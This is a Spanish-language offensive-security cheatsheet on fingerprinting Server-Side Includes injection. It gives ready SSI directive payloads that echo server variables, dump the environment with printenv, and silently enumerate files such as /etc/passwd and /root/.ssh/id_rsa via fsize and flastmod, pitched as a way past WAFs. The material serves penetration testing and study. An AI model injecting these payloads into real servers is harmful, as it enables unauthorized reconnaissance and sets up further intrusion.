---
aliases:
  - SSI echo
  - SSI fsize
  - SSI fingerprint
tags:
  - type/cheatsheet
  - vuln/ssi
  - technique/discovery
  - asset/web-app
primary categories:
secondary categories:
tertiary categories:
type: CheatSheet
linked:
  - "[[Server-Side Includes (SSI) Injection]]"
---
# SSI - Fingerprinting

***

## Cheatsheet

| **Directiva** | **Payload** | **Info extraída** |
|:---:|:---:|---|
| **Probe SSI habilitado** | `<!--#echo var="DATE_LOCAL" -->` | Server date → si renderiza fecha = SSI activo. PoC más barata. |
| **Webserver user** | `<!--#echo var="REMOTE_USER" -->` | User autenticado (si hay auth HTTP). |
| **Document root** | `<!--#echo var="DOCUMENT_ROOT" -->` | Path absoluto del webroot → útil para LFI chains. |
| **Script filename** | `<!--#echo var="SCRIPT_FILENAME" -->` | Path completo al .shtml ejecutándose. |
| **All env vars** | `<!--#printenv -->` | Dump de **todas** las variables de entorno. |
| **Filesize** | `<!--#fsize file="/etc/passwd" -->` | Tamaño del archivo → enum existence. |
| **Last modified** | `<!--#flastmod file="/etc/passwd" -->` | Timestamp última modificación → enum + detección de cambios. |
| **Request URI** | `<!--#echo var="REQUEST_URI" -->` | URL completa de la request. |
| **Server software** | `<!--#echo var="SERVER_SOFTWARE" -->` | Version Apache/IIS exacta. |
| **Remote IP** | `<!--#echo var="REMOTE_ADDR" -->` | IP del cliente. |
^ssi-fingerprinting

___

## Overview

SSI expone variables de entorno CGI y atributos del archivo via directivas `#echo`, `#printenv`, `#fsize`, `#flastmod`. Ideal para:

1. **Confirmar SSI activo** sin payload ruidoso (PoC legítima con `DATE_LOCAL`).
2. **Mapear filesystem** — `#fsize` y `#flastmod` revelan si archivo existe sin leerlo (útil cuando `#include` está filtrado).
3. **Recolectar info del server** — versión exacta de Apache/IIS + SO + vhost config para chain exploits.

### Variables CGI estándar útiles

```
DATE_LOCAL              → server date/time (PoC)
DATE_GMT                → UTC time
DOCUMENT_NAME           → nombre del .shtml actual
DOCUMENT_URI            → URI del archivo
DOCUMENT_ROOT           → path absoluto webroot
LAST_MODIFIED           → mtime del archivo actual
SERVER_SOFTWARE         → ej "Apache/2.4.41 (Ubuntu)"
SERVER_NAME             → hostname
SERVER_PROTOCOL         → HTTP/1.1
SERVER_PORT             → 80/443
REQUEST_METHOD          → GET/POST
REQUEST_URI             → URL completa con query string
SCRIPT_FILENAME         → path absoluto del script
REMOTE_ADDR             → IP del cliente
REMOTE_USER             → user auth HTTP
HTTP_USER_AGENT         → UA string
HTTP_COOKIE             → cookies de la request
HTTP_REFERER            → referer
PATH_INFO               → extra path info
QUERY_STRING            → raw query string
```

### Enum de filesystem silencioso

`#fsize` retorna:
- Número si archivo existe y readable.
- Error literal `[an error occurred while processing this directive]` si no.

Diff de respuestas permite mapear archivos sin tocar `#include` (menos flagged por WAFs).

```html
<!--#fsize file="/etc/passwd" -->         <!-- 2847 -->
<!--#fsize file="/root/.ssh/id_rsa" -->   <!-- error → no readable -->
<!--#fsize file="/var/backups/db.sql" --> <!-- 82412 → existe -->
```

### Config flags adicionales

```html
<!--#config sizefmt="bytes" -->        <!-- fsize output en bytes vs abbreviated -->
<!--#config timefmt="%Y-%m-%d %H:%M" --> <!-- format de flastmod output -->
<!--#config errmsg="ERROR" -->         <!-- cambiar error string default -->
```

***
